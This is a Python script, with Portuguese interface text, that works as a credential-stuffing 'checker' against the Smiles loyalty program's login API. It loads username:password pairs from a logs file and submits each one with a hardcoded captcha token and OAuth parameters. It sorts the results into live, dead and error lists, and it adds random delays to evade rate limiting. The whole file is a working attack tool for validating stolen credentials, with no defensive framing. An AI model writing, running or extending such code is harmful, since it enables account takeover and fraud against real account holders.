import requests
import json
import time
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import random

init(autoreset=True)

MAX_THREADS = 3
TIMEOUT = 15
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
ERROR_FILE = 'error.txt'

stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'captcha': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  #limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "      SMILES CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f"LIVE: {stats['live']}")
    print(Fore.RED + f"DIE: {stats['die']}")
    print(Fore.YELLOW + f"ERROR: {stats['error']}")
    print(Fore.MAGENTA + f"CAPTCHA: {stats['captcha']}")
    print(Fore.CYAN + f"TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def get_initial_cookies():
    try:
        session = requests.Session()
        response = session.get(
            "https://login.smiles.com.br/login",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
            },
            timeout=TIMEOUT
        )
        return session.cookies.get_dict()
    except:
        return {}

def check_account(username, password):
    try:
        cookies = get_initial_cookies()
        if not cookies:
            stats['error'] += 1
            save_result(ERROR_FILE, username, password, "Falha ao obter cookies")
            return Fore.RED + "× Erro: Cookies não obtidos"

        headers = {
            "Host": "login.smiles.com.br",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://login.smiles.com.br",
            "Referer": "https://login.smiles.com.br/login",
            "X-Requested-With": "XMLHttpRequest"
        }

        payload = {
            "client_id": "yyN6KhyOb2PGGP8dphUgE584WciGpTrH",
            "redirect_uri": "https://www.smiles.com.br/logincb?dest=",
            "tenant": "smiles-prod",
            "response_type": "code",
            "scope": "openid profile email",
            "audience": "https://smiles.api",
            "_csrf": cookies.get('_csrf', ''),
            "state": "hKFo2SBBRzZpVHNPT3REd1l0VThkTDdTaGl5dGNEbS1yV0ZaOaFupWxvZ2luo3RpZNkgemJBaDBEaWtlR3FkRjBIejM4UnpDUnh1R1hVMXlCZjGjY2lk2SB5eU42S2h5T2IyUEdHUDhkcGhVZ0U1ODRXY2lHcFRySA",
            "_intstate": "deprecated",
            "username": username,
            "password": password,
            "captcha_smiles": "03AFcWeA5S_dXyAX4ZJKg8-GZD5HEiy1OpaHra-BTLD0HYyehs825DN7jw3iu5UY05n2RUSZejPXnaVloZlulWySxvjSnYKYEBy4w5zwPm7T1wgUhkAlbGvVDd3sKvHzLLhbiGRJZ_qLJwFGReLmSYikYrQkiYOqFvE8hwhMBqkhPZEg3yJYRosBUF7caoiSFyGfaCCWDirNTZOvuaHztcw5sfTfyakEl6MYac7zoWgzolm5FVC67g15n09Vb5e2nAhm04JqLMfH0oosfQpiSTvY1zcl1FnhjOSsJBlM06hUc1BBZUBQ-9FdgqEnlyfa4lgNear5Z6I9ANok-X3QmoKeqhMoM7QADDHyNywfc2N860c4SaXDeuWVDeM3VKK2V6E_xUZnwtN_P8TkuubK3fQ29r4K0VvVkzmu76d3fv5wAPLfQ7wnKOtCjH24SfiuZ8Ct8kgJhE1__gq9UXwDlRg7-RkBZpkZqVkGRV81PPi4ryEvUXhrUiY9GMZhL4VSAwfA6sAsSLUgNHDs1yWfOhxNKSdjcBaer_crW5pu8NWER5uD02CBK5O_uxUsj4Wv7nvtKppMdKfpY9ePkczkpXkc5pvpGQ_67CH60H_a5AONsbs8YxoppeoHFHKITqU3EvS2uJZDqBtXAt1NxpR0_WQQQjmD9T3iKL6uWGnzMyWPiz0hNr24fLbAnpvXBi_VDZgEBpL2cG1FGPZrGTOyHnYA9-1en0aqu24jnWxKS11N6nmoHCRuzDQCxfBAn9XPwqXVmBNwyMUmb7eJIYWaDRM2fMmEunGKWcs91MAmPys7F15lA5Xg1hUaaHUAxmVIwTeFR541ME7m09k-PITvqdXu5GXggwDRNMVEiErfVMiEq0ZbInv_DkY7I5Oavgw2_UAMajjVUqm1LQCVCirOHfPtM3vXE2PXntob5dC7ndN3VcutPr7IU5nXfjOT3zUJ2TZdIYRyYtTsYF1r6s_3x1ol03EWLqMqn4rOZgJSicp2j3TtuOJGpg6OWE5uZc1epFVuIWIoyO1CFfwchrBfB6_QquId3FUZ_Y-TzZNGVj1VKlDTiupmfok3eRcawuMyEQ-nYAqiagsJmlHJf3Z6pc9tcr6l48WSC5BsMPtKeB6JX4Jx0kHoEVY4PTm3x43tqn7beWZgW5pma8ylPJRjZqc8l7HE2Ytir8g85hVzlLWQdNgpToBSsXo9ueh34hl6a7x96_7NZXZP-WX25urRxdbMqzT6E4HeQpmEwqBDOHZg_g5XQsB0euv2YEg6ussrQU0slAanJOayg8LI5T6_9hDR03_vqZQqhilIczUqi_SXlYW_dmTOwnJAopUbGrnIotR9pv6Bvc294yhFcjaxit8sTmw82cJ8etdmqcR643UK5-MPEQxweO7bGA6V-wamrwrchFvbG0-yc4PDB_JuigD84YYcLY5UyfsX7b3eNx5P25XuZfPu0ZEjXsA6LbvHqNq2LFi-hXD5oEQHEAjWY-raMaLHLVVPrRvwMHrT_Tc4KRv3zKVW2koD6ORTYA4FZ5SN08Qr9PILMr2rSwrqYvvbAPTcxlTfy2IYrwokpsn7i9GfTynkeplUOXhMjCMJgwdzxKirtd0B865KiQlG9tASxL5z0vI2vshh_o_e-_isRou6uznP6reVTarhHsDQYFjiWU-wgkZyNO7VnmIkY7jbOL0z27hk5Iw3wbS_e1hdYRIdwPMu_nceCTeHoDbvhglRGZqn2GftO41SGAMJ_M1aL861F6Ot9Bc20VeTkxKqMhJDRK36PPv-sEMgHDRv-E0Nf1D5FGQzEX36uz9GLlI--1EBnDviD5Nt1np43f_HAuUs__ZysguaO8Fb0JhDjwIVUlqgoE5ChaOo2MEdJ567k0Er4JdC8aiTN0GDbqPfSckquzdPtkWERuSdBh3II2qCS-ccKiHtF9CRpiKpZ7OvLOoWHDDHHDl0cMwQCP5Dfd0U_ipHKUaXX-Uu567hsP2FRcKejCTq8w2arMb8OVetoBvQlC9w9bntcjka1UTFrmrDxaZrLWr8307SjjHtWfX4efOMKaJaO6WRbDcuasbeSdLn4ou0v-YYjDSia20z-xjp8vTejGTHlLtW2eKb-Y3MnEGrxiVP4dWWg1s7BCJeRgPK1V2-DvAbjsySPeB9a6DVc11OEqEO2nUXmQqAbr4jEHG4v8jrY46LIACC_mEoq6fLBfP3nkQFkX52mYmikdGENMdlKobXc6CZAIw4Tl0qZDho5_5v1p9dFHPMFDtL0ZmtX7Dto2IkVPbnEBNlWszxsFn5O35W_iY3H-Q1VZ4D4wdORBr8vIK9o6Twa809oBmxk1pgxK50PicZPyWx86PDmNINzJcIivlIH64ALzn1u43incN12xMScJRX14ZoShd-6VhHc7SA",
            "connection": "smilesdb"
        }

        response = requests.post(
            "https://login.smiles.com.br/usernamepassword/login",
            headers=headers,
            cookies=cookies,
            json=payload,
            timeout=TIMEOUT
        )

        if response.status_code == 200:
            data = response.json()
            if 'error' in data and data['error'] == 'invalid_grant':
                stats['die'] += 1
                save_result(DIE_FILE, username, password)
                return Fore.RED + f"Die {username}"
            elif 'access_token' in data:
                stats['live'] += 1
                save_result(LIVE_FILE, username, password)
                return Fore.GREEN + f"Live {username}"
            else:
                stats['error'] += 1
                save_result(ERROR_FILE, username, password, "Resposta inesperada")
                return Fore.YELLOW + f"Erro {username} - Resposta inesperada"
        elif response.status_code == 429:
            stats['captcha'] += 1
            save_result(ERROR_FILE, username, password, "CAPTCHA requerido")
            return Fore.MAGENTA + f"Captcha {username}"
        else:
            stats['error'] += 1
            save_result(ERROR_FILE, username, password, f"HTTP {response.status_code}")
            return Fore.RED + f"× Erro {username} - HTTP {response.status_code}"

    except Exception as e:
        stats['error'] += 1
        save_result(ERROR_FILE, username, password, str(e))
        return Fore.RED + f"× Erro {username} - {str(e)[:30]}"

def save_result(filename, username, password, extra_info=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{username}:{password}"
            if extra_info:
                line += f" | {extra_info}"
            f.write(line + "\n")
    except:
        pass

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
        accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    
    stats['total'] = len(accounts)
    update_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            if len(acc) == 2:
                user, password = acc[0], acc[1]
                futures.append(executor.submit(check_account, user, password))
                time.sleep(random.uniform(1, 3))  #delay aleatório

        for future in as_completed(futures):
            print(future.result())
            update_panel()

    print(Fore.CYAN + "\ncheckin concluída!")
    print(Fore.GREEN + f"Contas live: {LIVE_FILE}")
    print(Fore.RED + f"Contas die: {DIE_FILE}")
    print(Fore.YELLOW + f"Erros: {ERROR_FILE}")

if __name__ == "__main__":
    main()